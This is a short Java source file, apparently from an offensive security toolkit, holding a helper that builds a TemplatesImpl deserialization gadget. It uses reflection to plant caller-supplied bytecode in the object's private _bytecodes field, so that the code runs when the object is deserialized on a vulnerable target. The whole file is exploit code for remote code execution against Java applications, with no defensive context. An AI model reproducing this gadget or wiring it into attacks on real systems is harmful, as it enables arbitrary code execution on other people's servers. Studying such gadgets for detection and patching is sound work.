package cn.safe6.util;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import java.lang.reflect.Field;

public class Gadgets {

    public static Object createTemplatesImpl(byte[] bytes) throws Exception {
        byte[] classBytes = bytes;
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();

        Field f0 = templates.getClass().getDeclaredField("_bytecodes");
        f0.setAccessible(true);
        f0.set(templates,targetByteCodes);

        f0 = templates.getClass().getDeclaredField("_name");
        f0.setAccessible(true);
        f0.set(templates,"name");

        f0 = templates.getClass().getDeclaredField("_class");
        f0.setAccessible(true);
        f0.set(templates,null);
        return templates;
    }


}
